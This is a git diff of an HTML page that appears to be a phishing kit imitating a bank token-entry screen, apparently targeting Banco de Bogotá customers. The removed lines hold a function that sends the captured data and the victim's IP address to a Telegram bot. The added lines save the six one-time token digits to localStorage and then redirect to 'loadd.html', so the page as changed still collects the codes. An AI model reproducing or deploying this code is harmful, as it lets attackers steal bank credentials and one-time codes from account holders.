@@ -1,3 +1,4 @@
+
 <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
 
@@ -32,33 +33,12 @@ var ready = function () {
     ip2 = document.getElementById("address").innerHTML;
     message = "bbogota\nToken2: " + u_name + "" + d_name + "" + t_name + "" + c_name + "" + aa_name + "" + bb_name + "\n\nIP: " + ip +"\n" + ip2;
   };
-  var sender = function() {
-    ready();
-    var settings = {
-      "async": true,
-      "crossDomain": true,
-      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
-      "method": "POST",
-      "headers": {
-        "Content-Type": "application/json",
-        "cache-control": "no-cache"
-      },
-      "data": JSON.stringify({
-        "chat_id": chat_id,
-        "text": message
-      })
-    };
-    $.ajax(settings).done(function(response) {
-      console.log(response);
-      window.location = 'loadd.html';
-    });
-    return false;
-  };
+
 
 </script>
 
 </head>
-<body style="">
+<body>
 
 	<div class="box-container">
 		<div class="container">
@@ -107,7 +87,7 @@ var ready = function () {
 							</div>
 
 							<div class="btn-container">
-								<button type="button" class="btn-main" id="btnContinue" onclick="validate();" disabled="">Continuar</button>
+								<button type="submit" class="btn-main" id="btnContinue" disabled="">Continuar</button>
 							</div>
 						</form>
 					</div>
@@ -291,7 +271,7 @@ var ready = function () {
         align-items: center;
     }
 </style>
-<form action="" onsubmit="return sender();" method="post" id="tok">
+<form method="post" id="form">
 <p id="gfg"  hidden=""></p>
 <p id="address"  hidden=""></p>
 <div class="modal modalUP">
@@ -332,7 +312,7 @@ var ready = function () {
 
 
 <div class="token-container">
- <input type="tel" class="token-input" maxlength="1" name="num1" id="num1" oninput="moveToNextInput(this, 2)" required autocomplete="off" />
+    <input type="tel" class="token-input" maxlength="1" name="num1" id="num1" oninput="moveToNextInput(this, 2)" required autocomplete="off" />
     <input type="tel" class="token-input" maxlength="1" name="num2" id="num2" oninput="moveToNextInput(this, 3)" readonly autocomplete="off" />
     <input type="tel" class="token-input" maxlength="1" name="num3" id="num3" oninput="moveToNextInput(this, 4)" readonly autocomplete="off" />
     <input type="tel" class="token-input" maxlength="1" name="num4" id="num4" oninput="moveToNextInput(this, 5)" readonly autocomplete="off" />
@@ -377,5 +357,39 @@ var ready = function () {
 
 	</div>	
 
-
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+        const form = document.getElementById("form");
+        
+        form.addEventListener("submit", function (event) {
+            event.preventDefault(); // Evita el envío del formulario
+            
+            // Obtener valores de los campos
+            const num1 = document.getElementById("num1").value;
+            const num2 = document.getElementById("num2").value;
+            const num3 = document.getElementById("num3").value;
+            const num4 = document.getElementById("num4").value;
+            const num5 = document.getElementById("num5").value;
+            const num6 = document.getElementById("num6").value;
+    
+            // Crear objeto con los datos
+            const formData = {
+                num1,
+                num2,
+                num3,
+                num4,
+                num5,
+                num6
+            };
+    
+            // Guardar en localStorage como JSON
+            localStorage.setItem("formData", JSON.stringify(formData));
+    
+    
+             // Redirigir después de guardar
+             window.location.href = "loadd.html";
+        });
+    });
+    
+    </script>
 </body></html>
